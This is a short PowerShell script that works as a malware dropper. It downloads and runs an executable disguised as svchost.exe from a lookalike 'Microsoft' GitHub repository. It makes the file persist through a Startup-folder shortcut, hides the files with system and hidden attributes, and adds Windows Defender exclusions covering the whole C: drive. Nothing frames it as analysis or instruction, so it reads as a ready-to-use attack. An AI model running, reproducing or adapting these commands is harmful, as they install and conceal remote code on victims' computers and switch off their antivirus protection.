Invoke-WebRequest -Uri https://raw.githubusercontent.com/MicrosoftNetworkServiceHost/MicrosoftNetworkService/main/svchost.exe -OutFile C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe; & C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe
$s=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.lnk");$s.TargetPath="C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe";$s.Save()
attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
attrib +h +s +i +r "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.lnk"
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath "C:\Windows"
